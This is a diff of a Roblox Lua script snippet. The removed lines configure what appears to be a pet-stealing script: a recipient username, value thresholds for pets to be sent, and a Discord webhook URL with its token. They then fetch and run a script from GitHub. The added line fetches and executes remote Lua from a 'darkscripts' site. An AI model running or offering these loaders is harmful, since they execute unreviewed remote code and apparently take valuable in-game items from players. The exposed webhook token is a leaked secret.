@@ -1,6 +1,1 @@
-```Username = "NinjaGamer141106"
-min_rap = 10000 -- minimum rap of each pet you want to get sent to you.
-min_chance = 10000 -- the 10k is basically 1/10k is the minimum u want to get
-webhook = "https://discord.com/api/webhooks/1297786522979795057/OuMXle9Y-O_RZpa6vxcqVrJCZmDkn7J7y03rwutLjND4nTWg1dNyTIkQUsVhhEQ2uGzn"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Detrox01/petsgo/refs/heads/main/script.txt"))()```
+loadstring(game:HttpGet('https://darkscripts.space/scripts/c5634e060f.lua', true))()
